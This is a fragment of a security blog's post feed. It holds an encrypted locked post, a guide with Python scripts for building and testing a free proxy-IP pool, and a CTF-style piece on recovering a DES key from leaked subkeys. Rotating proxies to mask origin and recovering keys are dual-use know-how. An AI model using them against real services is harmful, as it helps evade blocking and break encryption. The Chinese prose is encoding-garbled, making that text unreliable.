61e9127e29d04a7bb7118fb1e69f76ca2da0cbdb0eb99011abf76f421975a6b27218620076d02b85b2c3f4d08ea7ab70cdc3f446a0040ed5486d975af3aea4e870687dc5bf093bcbcb6b3047ab698b780597fc0bb0f079e3b5be22e42fdd8af99b2370f677d9133bf3e284a8282983ce8e4a92c8515c7a2aff21a58117daeb7cc0d79cbe8466ca3cae8c24343caf25b5ca0c8e58493b729819e706ea8d7be1767a21482d78bce6c44add2bfe75be9453106778b99cc4e8f979e1820361a1c546020aa84aa1c88d14754f279befdd8e6d4eb9315663024d92fb236b38d39a97f2d681adc94f07eed00351334762ad6e2eda6e4503752bd42a6311473e4850431cb5bb7b2a0918ed8a54d94cead58bce168af4c019c0a36638305b20afba39b2dadedbb22c09b83ba44ab45b2638aeaa0c370fee86b8fdfef85df7cadb2a3fe661b16deb3a1050cb23da99675eef1a1e980bcb5fac63a2ddccb5090f3b9c052df2f4b8931802ba83aaf7a084a788b6ca2d98056e6c323ca776ab404d4248bfcb97afbe08a2d507d2a288a26ec9c0093f305a347ce42bc27ad68b504d3b0594f4a79cf22219d05193e4e2818ba6f673ce41d0761a28466397565e11b16544cd049e3d134c1619e6e6453e08756c894ff0cf6cadfe07ffd628b1277141f6441e655d482feb4914c768e1a75c4d0830cf892cd3b1a100a20272d0cded5ed2985a23f83dc9860e10279b647c3f0f4cdc5999359fc8f17f925468f8799ee45fc382e24c428d5f0fe30d7799d14f4f9c8201d8b4d34addcee50a3d06000c37f1c1c4505db4801b5826485f9fbffa6098eeaa849779d22879fb35117238437097bb002b227753292eb679f9e057a23aa8968e9d64fd34f10bf85f9b573b0adf89dcd7fe09c12ac909571704a7f7568f91cad8a6d9ebbf03134f2699162d9221cce852733f923428dc2e009b5fef6f52a48d64a32cd3103962f9da176b4e325031383305b90fef64d190efbc4bf73cb760e4c4f57c731f92575405de8c367f7a632f251a35b116b847f9b6f5d9da494a25e63bd686c448f924ccb255b0f69b65e17e6787882147179c30a910e8ff11044c4c8dc91e4ea727d5a55f7a6107553b0b96c8a6eb4d7c815daf0ae9403b0d6c16ab1fbf02994b66a55edf8b4ff753114bcf69f5fdbc63ec46588c88c77df64f5c5a283d2b728cf900b34ebff01c2e15cd4d7731f3803bbd078e04ca069aec586888a265fe754ed7e4f79aefc54e16722e3467d42486f7d2835a05c6b32e205ccc4da65b6f586d9beb66946b87529dd80eb082c2b811fc00d5803987376d49a6985b1252e7bce20b736a491e9b7da08cffb1790f065d37d377e7b333b7ab0ef0eff50f3fb4c06b3351c6cd6b53c630eb9e508ccad6afb118d64c2cc1600def1ae9a97d6e5e77f1aa6cd595cdb6f0a44beb2ab35f9347bfe979baab09bca0ffebd264b39fa1d8242f0b8b60592124eda82fb051c36b2b354543b044b264672e7c58d6a86debd6a2c7ff91aff53bef2bcff5ed8ce0391d11746c018fd8496db46cc01259962409683ef03bbc7e2d3941f9e048721d8541b506d70b04d0d696c4721c4ec9853fb104c64e952951be0b448948020b9721836ec06472b2594de35da9d8878fe45986927059a6794b246e0a778ee81c0f83da3d97d99d428be3b47a104114be7e7ebba6737b04856efea7cd349aa75474bcaec3bc0b6fb749cac62646281cc407889e50f24b4d647c7a022876a3ca42a5670cc5096c81ec8c009535239d5e7d2ba1e691365fb0a518793098d21df12f15b132a77148c2a074e8888565757bdef0aa5dfaaabf2d226a0dd4b88699a5e5f9695190a8de6a45c9d653b3fd16535e17ddbb4a47e249351a51c503580c49966f2300d1fc9ccf55cdf02c0395a546bc6b01fe2daf3f1dd1c5aba64b474d97d5adef2919027dd347d09900c46f50c33f42a08315322a20c4300</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>IPPool</title>
    <url>/posts/8f61ec68/</url>
    <content><![CDATA[<h3 id="Proxy-pool"><a href="#Proxy-pool" class="headerlink" title="Proxy_pool"></a><em>Proxy_pool</em></h3><p>é¡¹ç›® <a href="https://github.com/jhao104/proxy_pool/tree/master">https://github.com/jhao104/proxy_pool/tree/master</a></p>
<p>å®‰è£…redis å¹¶è¿è¡Œ ./redis-serve</p>
<p>cd proxy_pool</p>
<p>pip3 install -r requirements.txt</p>
<p>vim setting.py</p>
<p>ä¿®æ”¹rediså¯†ç </p>
<p><img src="/posts/8f61ec68/1.jpg" alt="img"></p>
<p>./start.sh è¿è¡Œå³å¯</p>
<p><img src="/posts/8f61ec68/2.jpg" alt="img"></p>
<p>æ¯æ¬¡è®¿é—® è¿™ä¸ªapiæ¥å£ éƒ½ä¼šå¾—åˆ°ä¸åŒçš„ä»£ç†æ± IP  <a href="http://127.0.0.1:5010/get/">http://127.0.0.1:5010/get/</a></p>
<p><img src="/posts/8f61ec68/3.jpg" alt="img"></p>
<p>åç»­å¯æ ¹æ®éœ€è¦é‡æ–°å†ä»£ç åŸºç¡€ä¸Šæ­£åˆ™ æˆ–è€… é¢å¤–åŠ æ–¹æ³• è¾“å‡ºip:portå³å¯</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getRdmProxyIP</span>():</span><br><span class="line"></span><br><span class="line">    req = requests.get(url=<span class="string">&quot;http://192.168.80.96:5010/get&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(req.content)</span><br><span class="line">    resp_str = req.content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    resp_json = json.loads(resp_str)</span><br><span class="line">    <span class="comment"># åˆ¤æ–­æ˜¯å¦ä¸º https</span></span><br><span class="line">    is_https = resp_json.get(<span class="string">&quot;https&quot;</span>, <span class="literal">False</span>)</span><br><span class="line">    <span class="comment"># æå– proxy</span></span><br><span class="line">    proxy = resp_json.get(<span class="string">&quot;proxy&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="comment"># è¾“å‡ºç»“æœ</span></span><br><span class="line">    protocol = <span class="string">&quot;https&quot;</span> <span class="keyword">if</span> is_https <span class="keyword">else</span> <span class="string">&quot;http&quot;</span></span><br><span class="line">    <span class="comment"># print(f&quot;&#123;protocol&#125;://&#123;proxy&#125;&quot;)</span></span><br><span class="line">    res = <span class="string">f&quot;<span class="subst">&#123;protocol&#125;</span>://<span class="subst">&#123;proxy&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getAllProxyIP</span>():</span><br><span class="line">    proxys = []</span><br><span class="line">    req = requests.get(url=<span class="string">&quot;http://192.168.80.96:5010/all&quot;</span>)</span><br><span class="line">    <span class="comment"># print(req.content)</span></span><br><span class="line">    resp_str = req.content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    resp_jsons = json.loads(resp_str)</span><br><span class="line">    <span class="comment"># print(len(resp_jsons))</span></span><br><span class="line">    <span class="keyword">for</span> json_obj <span class="keyword">in</span> resp_jsons:</span><br><span class="line">        <span class="comment"># åˆ¤æ–­æ˜¯å¦ä¸º https</span></span><br><span class="line">        is_https = json_obj.get(<span class="string">&quot;https&quot;</span>, <span class="literal">False</span>)</span><br><span class="line">        <span class="comment"># æå– proxy</span></span><br><span class="line">        proxy = json_obj.get(<span class="string">&quot;proxy&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="comment"># è¾“å‡ºç»“æœ</span></span><br><span class="line">        protocol = <span class="string">&quot;https&quot;</span> <span class="keyword">if</span> is_https <span class="keyword">else</span> <span class="string">&quot;http&quot;</span></span><br><span class="line">        <span class="comment"># print(f&quot;&#123;protocol&#125;://&#123;proxy&#125;&quot;)</span></span><br><span class="line">        proxys.append(<span class="string">f&quot;<span class="subst">&#123;protocol&#125;</span>://<span class="subst">&#123;proxy&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> proxys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># RdmIP = getRdmProxyIP()</span></span><br><span class="line">    <span class="comment"># print(RdmIP)</span></span><br><span class="line">    proxy_list = getAllProxyIP()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] å½“å‰å¯ç”¨å…è´¹ä»£ç†å…±&#x27;</span>,<span class="built_in">len</span>(proxy_list),<span class="string">&#x27;ä¸ª&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(proxy_list)</span><br><span class="line"></span><br><span class="line">    random_proxy = random.choice(proxy_list)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(random_proxy)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> random_proxy.startswith(<span class="string">&#x27;https&#x27;</span>):</span><br><span class="line">        proxy = &#123;<span class="string">&#x27;https&#x27;</span>: random_proxy&#125;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        proxy = &#123;<span class="string">&#x27;http&#x27;</span>: random_proxy&#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(proxy)</span><br><span class="line"></span><br><span class="line">    req = requests.get(url=<span class="string">&quot;http://ipinfo.io&quot;</span>,proxies=proxy)</span><br><span class="line">    <span class="keyword">if</span> req.status_code == <span class="number">200</span>:</span><br><span class="line">        resp = req.content</span><br><span class="line">        <span class="built_in">print</span>(resp)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] error, bad status_codeï¼š&quot;</span>,req.status_code)</span><br></pre></td></tr></table></figure>

<p><img src="/posts/8f61ec68/s4.jpg" alt="img"></p>
<p>åœ¨å…è´¹çš„ä»£ç†ä¸­ æœ‰éƒ¨åˆ†ä»ä¸å¯ç”¨ ä¼šè¿”å›404notfound æˆ–è€…è¯·æ±‚å¤±è´¥ç­‰  å…è´¹ä»£ç†æ± è¿˜æ˜¯å­˜åœ¨ä¸èƒ½ç”¨çš„é—®é¢˜ã€‚ã€æ¯•ç«Ÿç™½å«–çš„ èƒ½ç”¨å°±è¡Œå§ã€‘</p>
<p>è·‘äº†20æ¬¡ æˆåŠŸ13æ¬¡ å‹‰å¼ºè¿˜ç®—è¡Œå§  50æ¬¡ æˆåŠŸ37æ¬¡</p>
<p>httpsçš„åŸºæœ¬ä¸Šä¸è¡Œ ä¹‹å‰éƒ½å»æ‰äº†</p>
<p><img src="/posts/8f61ec68/5.jpg" alt="img"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getRdmProxyIP</span>():</span><br><span class="line">    req = requests.get(url=<span class="string">&quot;http://192.168.80.96:5010/get&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(req.content)</span><br><span class="line">    resp_str = req.content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    resp_json = json.loads(resp_str)</span><br><span class="line">    <span class="comment"># åˆ¤æ–­æ˜¯å¦ä¸º https</span></span><br><span class="line">    is_https = resp_json.get(<span class="string">&quot;https&quot;</span>, <span class="literal">False</span>)</span><br><span class="line">    <span class="comment"># æå– proxy</span></span><br><span class="line">    proxy = resp_json.get(<span class="string">&quot;proxy&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="comment"># è¾“å‡ºç»“æœ</span></span><br><span class="line">    protocol = <span class="string">&quot;https&quot;</span> <span class="keyword">if</span> is_https <span class="keyword">else</span> <span class="string">&quot;http&quot;</span></span><br><span class="line">    <span class="comment"># print(f&quot;&#123;protocol&#125;://&#123;proxy&#125;&quot;)</span></span><br><span class="line">    res = <span class="string">f&quot;<span class="subst">&#123;protocol&#125;</span>://<span class="subst">&#123;proxy&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getAllProxyIP</span>():</span><br><span class="line">    proxys = []</span><br><span class="line">    req = requests.get(url=<span class="string">&quot;http://192.168.80.96:5010/all&quot;</span>)</span><br><span class="line">    <span class="comment"># print(req.content)</span></span><br><span class="line">    resp_str = req.content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    resp_jsons = json.loads(resp_str)</span><br><span class="line">    <span class="comment"># print(len(resp_jsons))</span></span><br><span class="line">    <span class="keyword">for</span> json_obj <span class="keyword">in</span> resp_jsons:</span><br><span class="line">        <span class="comment"># åˆ¤æ–­æ˜¯å¦ä¸º https</span></span><br><span class="line">        is_https = json_obj.get(<span class="string">&quot;https&quot;</span>, <span class="literal">False</span>)</span><br><span class="line">        <span class="comment"># å¦‚æœæ˜¯ https åˆ™è·³è¿‡</span></span><br><span class="line">        <span class="keyword">if</span> is_https:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># æå– proxy</span></span><br><span class="line">        proxy = json_obj.get(<span class="string">&quot;proxy&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="comment"># è¾“å‡ºç»“æœ</span></span><br><span class="line">        protocol = <span class="string">&quot;https&quot;</span> <span class="keyword">if</span> is_https <span class="keyword">else</span> <span class="string">&quot;http&quot;</span></span><br><span class="line">        <span class="comment"># print(f&quot;&#123;protocol&#125;://&#123;proxy&#125;&quot;)</span></span><br><span class="line">        proxys.append(<span class="string">f&quot;<span class="subst">&#123;protocol&#125;</span>://<span class="subst">&#123;proxy&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> proxys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># RdmIP = getRdmProxyIP()</span></span><br><span class="line">    <span class="comment"># print(RdmIP)</span></span><br><span class="line">    proxy_list = getAllProxyIP()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] å½“å‰å¯ç”¨å…è´¹ä»£ç†å…±&#x27;</span>, <span class="built_in">len</span>(proxy_list), <span class="string">&#x27;ä¸ª&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(proxy_list)</span><br><span class="line"></span><br><span class="line">    successnum = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line"></span><br><span class="line">        random_proxy = random.choice(proxy_list)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(random_proxy)</span></span><br><span class="line">        <span class="keyword">match</span> = re.<span class="keyword">match</span>(<span class="string">r&#x27;http://(\d+\.\d+\.\d+\.\d+):\d+&#x27;</span>, random_proxy)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">match</span>:  ip_address = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">        ip_bytes = <span class="built_in">bytes</span>(ip_address, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> random_proxy.startswith(<span class="string">&#x27;https&#x27;</span>):</span><br><span class="line">            proxy = &#123;<span class="string">&#x27;https&#x27;</span>: random_proxy&#125;</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            proxy = &#123;<span class="string">&#x27;http&#x27;</span>: random_proxy&#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(proxy)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            req = requests.get(url=<span class="string">&quot;http://ipinfo.io&quot;</span>, proxies=proxy)</span><br><span class="line">            <span class="keyword">if</span> req.status_code == <span class="number">200</span>:</span><br><span class="line">                resp = req.content</span><br><span class="line">                <span class="comment"># print(resp)</span></span><br><span class="line">                <span class="comment"># print(ip_bytes)</span></span><br><span class="line">                <span class="keyword">if</span> ip_bytes <span class="keyword">in</span> resp:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;[+] success!&#x27;</span>,ip_address)</span><br><span class="line">                    successnum += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] error, bad status_codeï¼š&quot;</span>, req.status_code)</span><br><span class="line">        <span class="keyword">except</span> requests.Timeout:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Timeout error: The request timed out&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Request error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(successnum)</span><br></pre></td></tr></table></figure>

<p><img src="/posts/8f61ec68/6.jpg" alt="img"></p>
<p>æ•´ä½“æ•ˆæœ æˆåŠŸç‡60%å·¦å³</p>
]]></content>
  </entry>
  <entry>
    <title>DESå­å¯†é’¥é€†æ¨åˆå§‹å¯†é’¥ - å¾…å®Œæˆ</title>
    <url>/posts/9047dc7c/</url>
    <content><![CDATA[<p><a href="https://www.freebuf.com/news/topnews/219723.html">https://www.freebuf.com/news/topnews/219723.html</a></p>
<p><a href="https://blog.csdn.net/weixin_44110537/article/details/107524863">https://blog.csdn.net/weixin_44110537/article/details/107524863</a></p>
<p><a href="https://limbenjamin.com/articles/des-key-parity-bit-calculator.html">https://limbenjamin.com/articles/des-key-parity-bit-calculator.html</a></p>
<p>å¦‚æœDESåŠ å¯†åœ¨ä¸¤è½®æˆ–ä¸¤è½®ä»¥ä¸Šçš„å­å¯†é’¥æ³„éœ²ï¼Œå‡ ä¹å¯ä»¥æ¨å‡ºåˆå§‹å¯†é’¥ã€‚</p>
<p>ä½†æ˜¯ç”±äºæœ‰æ•ˆä½ä¸º56bitï¼Œæ‰€ä»¥åœ¨æ¢å¤åå¯æ¢å¤56bitï¼Œè¿˜å‰©8bitæœªçŸ¥ã€‚</p>
<p>ä½†æ˜¯æœ‰2^8=256ç§æƒ…å†µï¼Œå¯é€šè¿‡æš´åŠ›ç ´è§£è§£å‡ºã€‚ã€å‰ææ¡ä»¶æ˜¯æœ‰æ ‡å‡†è¯¯è¿›è¡Œåˆ¤æ–­æ˜¯å¦ä¸ºå‡†ç¡®çš„å­å¯†é’¥ã€‘</p>
<h2 id="DESå­å¯†é’¥ç”Ÿæˆ"><a href="#DESå­å¯†é’¥ç”Ÿæˆ" class="headerlink" title="DESå­å¯†é’¥ç”Ÿæˆ"></a>DESå­å¯†é’¥ç”Ÿæˆ</h2><p>æ­£å‘è¿‡ç¨‹å¦‚ä¸‹å›¾æ‰€ç¤º</p>
<p>![image-20240204115958526](/Users/mamor/Library/Application Support/typora-user-images/image-20240204115958526.png)</p>
<p>PC-1ç½®æ¢å¾—åˆ° Kâ€™ 56ä½</p>
<p>C0 D0 28ä½ è¿›è¡Œå·¦ç§»æ“ä½œ</p>
<p>ç»è¿‡PC-2ç½®æ¢å¾—åˆ° K1 48ä½</p>
<h3 id="1-PC-2-é€†ç½®æ¢"><a href="#1-PC-2-é€†ç½®æ¢" class="headerlink" title="1.PC-2 é€†ç½®æ¢"></a>1.PC-2 é€†ç½®æ¢</h3><h3 id="2-å¾ªç¯å·¦ç§»é€†è¿ç®—"><a href="#2-å¾ªç¯å·¦ç§»é€†è¿ç®—" class="headerlink" title="2.å¾ªç¯å·¦ç§»é€†è¿ç®—"></a>2.å¾ªç¯å·¦ç§»é€†è¿ç®—</h3><h3 id="3-PC-1-é€†ç½®æ¢"><a href="#3-PC-1-é€†ç½®æ¢" class="headerlink" title="3.PC-1 é€†ç½®æ¢"></a>3.PC-1 é€†ç½®æ¢</h3><h3 id="4-çˆ†ç ´å¥‡å¶æ ¡éªŒä½"><a href="#4-çˆ†ç ´å¥‡å¶æ ¡éªŒä½" class="headerlink" title="4.çˆ†ç ´å¥‡å¶æ ¡éªŒä½"></a>4.çˆ†ç ´å¥‡å¶æ ¡éªŒä½</h3><hr>
<h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyDes</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">deskey = <span class="string">&quot;********&quot;</span></span><br><span class="line">DES = pyDes.des(deskey)</span><br><span class="line">DES.setMode(<span class="string">&#x27;ECB&#x27;</span>)</span><br><span class="line">DES.Kn = [</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>],</span><br><span 